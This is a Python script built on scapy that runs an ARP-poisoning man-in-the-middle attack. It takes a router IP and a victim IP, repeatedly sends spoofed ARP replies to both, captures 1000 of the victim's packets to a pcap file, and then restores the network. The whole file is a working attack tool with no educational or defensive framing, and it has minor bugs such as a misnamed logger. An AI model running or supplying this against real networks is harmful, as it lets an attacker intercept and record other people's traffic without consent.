import sys
import threading
from scapy.all import * 
from loguru import logger as logging

# Commands for the host:
# sysctl -w net.ipv4.ip_forward=0

logging.remove()
logging.add(sys.stdout, colorize=True, format="<level>{level.icon}</level> <level>{message}</level>", level="TRACE")


# logging.level(name='TRACE', icon='>', color='<magenta><bold>')
logging.level(name='INFO', icon='[~]', color='<cyan><bold>')
logging.level(name='WARNING', icon='[!]', color='<yellow><bold>')
logging.level(name='DEBUG', icon='[*]', color='<blue><bold>')
logging.level(name='ERROR', icon='[X]', color='<red><bold>')
logging.level(name='SUCCESS', icon='[#]', color='<green><bold>')

# using ARP packets to get the mac address
def get_mac(ip_address):
    resp, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10, verbose=0)
    for _, r in resp:
        return r[ARP].hwsrc 
    return None

def restore_network(router_ip, router_mac, victim_ip, victim_mac):
    logging.info("Restoring the network.")

    # sending the true mac addresses to the devices
    send(ARP(op=2, hwsrc=victim_mac, psrc=victim_ip, pdst=router_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=0)
    send(ARP(op=2, hwsrc=router_mac, psrc=router_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=0)
    sys.exit(0)

# sending constant malitious ARP packets to the devices
def arp_poison(router_ip, router_mac, victim_ip, victim_mac):
    logging.info("Started ARP poisoning!")
    
    try:
        while True:
            send(ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=victim_ip), verbose=0)
            send(ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=router_ip), verbose=0)
            time.sleep(5) # sleep to not flood the network
    except Exception as e:
        logging.warning("Attack stopped. Restoring network.")
        restore_network(router_ip, router_mac, victim_ip, victim_mac)


if __name__ == "__main__":
    if (len(sys.argv) != 3):
        logger.debug(f"Usage: {sys.argv[0]} router_ip victim_ip")
        sys.exit(0)
    
    router_ip = sys.argv[1]
    victim_ip = sys.argv[2]

    router_mac = get_mac(router_ip)
    victim_mac = get_mac(victim_ip)

    if (router_mac is None):
        logging.error("Unable to get MAC of default gateway.")
        sys.exit(0)
    if (victim_mac is None):
        logging.error("Unable to get MAC of victim.")
        sys.exit(0)
    
    logging.debug(f"Default Gateway MAC: {router_mac}")
    logging.debug(f"Victim MAC: {victim_mac}")

    # starting the attack thread
    attack_thread = threading.Thread(target=arp_poison, args=(router_ip, router_mac, victim_ip, victim_mac))
    attack_thread.start()

    packet_count = 1000 # change this if you wish to capture more packets
    conf.iface = "eth0"

    try:
        sniff_filter = "ip host " + victim_ip
        logging.info("Starting network caputre.")
        packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
        
        # writing packets in a .pcap
        wrpcap(victim_ip + "_caputre.pcap", packets)
        logging.warning("Stopping network capture. Restoring network.")
        restore_network(router_ip, router_mac, victim_ip, victim_mac)
    except Exception as e:
        logging.warning("Attack stopped. Restoring network.")
        restore_network(router_ip, router_mac, victim_ip, victim_mac)
    finally:
        attack_thread.join()